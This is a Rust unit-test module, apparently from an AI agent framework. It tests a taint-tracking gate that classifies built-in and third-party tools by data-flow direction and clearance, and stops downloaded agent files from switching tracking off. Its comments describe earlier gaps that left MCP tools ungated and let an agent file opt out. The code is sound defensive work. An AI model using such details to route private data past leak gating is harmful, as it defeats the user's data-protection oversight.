    fn install_tool_is_classified_like_write_file() {
        assert_eq!(
            classified_builtin("install_tool"),
            classified_builtin("write_file")
        );
        let tc = builtin_tool_classification("install_tool");
        assert_eq!(tc.sensitivity, TaintLevel::Internal);
        assert_eq!(tc.direction, ToolDirection::Internal);
        assert_eq!(tc.clearance, TaintLevel::Public);
    }

    /// An unknown tool is almost always MCP or a Rhai script - third-party code
    /// talking to a third-party service. It fails closed. The old default was
    /// internal/internal, which assumed the safest case about the least-known
    /// code and left every MCP and script tool ungated.
    #[test]
    fn unknown_tools_fail_closed_as_outbound() {
        let tc = builtin_tool_classification("some_mcp_tool");
        assert_eq!(tc.sensitivity, TaintLevel::Public);
        assert_eq!(tc.direction, ToolDirection::Outbound);
        assert_eq!(tc.clearance, TaintLevel::Public);
    }

    #[test]
    fn builtin_edit_file_classification() {
        let tc = builtin_tool_classification("edit_file");
        assert_eq!(tc.sensitivity, TaintLevel::Internal);
        assert_eq!(tc.direction, ToolDirection::Internal);
        assert_eq!(tc.clearance, TaintLevel::Public);
    }

    #[test]
    fn builtin_list_dir_classification() {
        let tc = builtin_tool_classification("list_dir");
        assert_eq!(tc.sensitivity, TaintLevel::Internal);
        assert_eq!(tc.direction, ToolDirection::Inbound);
        assert_eq!(tc.clearance, TaintLevel::Public);
    }

    /// `read_files` is `read_file` over several paths, `fan_out` is many
    /// `spawn_agent`s at once, `edit_document` hands a draft to the person
    /// the way `present_for_review` does, and the context, todo and submit
    /// tools write the run's own state. None had an arm, so each fell to the
    /// third-party default and was gated as outbound: with taint tracking on
    /// and anything Private in context, reading two files raised a leak
    /// prompt while reading one did not.
    #[test]
    fn the_remaining_builtins_are_classified_like_their_siblings() {
        assert_eq!(
            classified_builtin("read_files"),
            classified_builtin("read_file"),
            "read_files"
        );
        assert_eq!(
            classified_builtin("fan_out"),
            classified_builtin("spawn_agent"),
            "fan_out"
        );
        assert_eq!(
            classified_builtin("edit_document"),
            classified_builtin("edit_file"),
            "edit_document"
        );
        for name in [
            "context_write",
            "context_append",
            "context_read",
            "context_delete",
            "context_list",
            "todo_add",
            "todo_done",
            "todo_note",
        ] {
            let tc = classified_builtin(name);
            assert!(tc.is_some(), "{name} has no arm");
            let tc = tc.unwrap();
            assert_eq!(tc.direction, ToolDirection::Internal, "{name}");
            assert_eq!(tc.sensitivity, TaintLevel::Internal, "{name}");
            assert_eq!(tc.clearance, TaintLevel::Public, "{name}");
        }
    }

    /// The submitted answer is the one thing a run hands to whoever asked
    /// for it, and over `lev serve` that reader is not on this machine. So
    /// `submit_output` is an outbound channel with Public clearance, the
    /// shape `shell` has, not the internal one the context tools share.
    #[test]
    fn submit_output_is_an_outbound_channel() {
        assert_eq!(
            classified_builtin("submit_output"),
            classified_builtin("shell"),
            "submit_output"
        );
    }

    /// The split exists so a caller can tell an arm from the default.
    #[test]
    fn a_third_party_name_has_no_arm_of_its_own() {
        assert_eq!(classified_builtin("some_mcp_tool"), None);
        assert_eq!(
            classified_builtin("shell"),
            Some(builtin_tool_classification("shell"))
        );
    }

    // ─── resolve_taint_enabled / resolve_security cascade ───────────────────

    fn sec(taint: bool) -> SecurityConfig {
        SecurityConfig {
            taint_tracking: taint,
        }
    }

    #[test]
    fn resolve_taint_enabled_inherits_global_when_unset() {
        assert!(!resolve_taint_enabled(false, None, None));
        assert!(resolve_taint_enabled(true, None, None));
    }

    #[test]
    fn resolve_taint_enabled_agent_may_opt_in_but_not_out() {
        // Global off, agent opts in - honored, that only tightens.
        assert!(resolve_taint_enabled(false, Some(&sec(true)), None));
        // Global on, agent tries to opt out - refused. `agent.leviath` is a
        // downloaded file; letting it disable the machine's data-flow
        // enforcement made taint tracking opt-out-by-installing-an-agent.
        assert!(resolve_taint_enabled(true, Some(&sec(false)), None));
    }

    #[test]
    fn resolve_taint_enabled_stage_may_opt_in_but_not_out() {
        // Stage opt-in beats agent opt-out and global off.
        assert!(resolve_taint_enabled(
            false,
            Some(&sec(false)),
            Some(&sec(true))
        ));
        // A stage opt-out cannot override the user's global on.
        assert!(resolve_taint_enabled(
            true,
            Some(&sec(true)),
            Some(&sec(false))
        ));
    }

    #[test]
    fn resolve_batch_tool_hint_cascade() {
        // Nothing set at narrower levels → inherit the global toggle (on default).
        assert!(resolve_batch_tool_hint(true, None, None));
        assert!(!resolve_batch_tool_hint(false, None, None));
        // Agent override beats global (both directions).
        assert!(!resolve_batch_tool_hint(true, Some(false), None));
        assert!(resolve_batch_tool_hint(false, Some(true), None));
        // Stage override beats agent and global (both directions).
        assert!(!resolve_batch_tool_hint(true, Some(true), Some(false)));
        assert!(resolve_batch_tool_hint(false, Some(false), Some(true)));
    }

    #[test]
    fn gate_decision_blocked_levels() {
        let blocked = GateDecision::Blocked {
            taint_level: TaintLevel::Private,
            clearance: TaintLevel::Public,
            source_regions: vec![],
            tool_name: "shell".into(),
        };
        assert_eq!(
            blocked.blocked_levels(),
            Some((TaintLevel::Private, TaintLevel::Public))
        );
        assert_eq!(GateDecision::Allowed.blocked_levels(), None);
    }

    #[test]
    fn resolve_security_prefers_most_specific_but_clamps_taint() {
        // Neither set → default whose taint_tracking follows global.
        assert!(resolve_security(true, None, None).taint_tracking);
        assert!(!resolve_security(false, None, None).taint_tracking);
        // Stage present → wins over agent for opting *in*.
        assert!(resolve_security(false, Some(&sec(false)), Some(&sec(true))).taint_tracking);
        // An agent opt-out cannot beat the user's global on - `resolve_security`
        // agrees with `resolve_taint_enabled` rather than disagreeing with it.
        assert!(resolve_security(true, Some(&sec(false)), None).taint_tracking);
    }

    #[test]
    fn test_region_taint_remove_at_recomputes_level() {
        let mut rt = RegionTaint::new();
        rt.add_entry(TaintLevel::Public);
        rt.add_entry(TaintLevel::Private);
        rt.add_entry(TaintLevel::Public);
        assert_eq!(rt.level(), TaintLevel::Private);

        // Removing the Private entry at index 1 recomputes the level down.
        rt.remove_at(1);
        assert_eq!(rt.entry_count(), 2);
        assert_eq!(rt.level(), TaintLevel::Public);

        // An out-of-range index is a no-op.
        rt.remove_at(99);
        assert_eq!(rt.entry_count(), 2);
    }
}
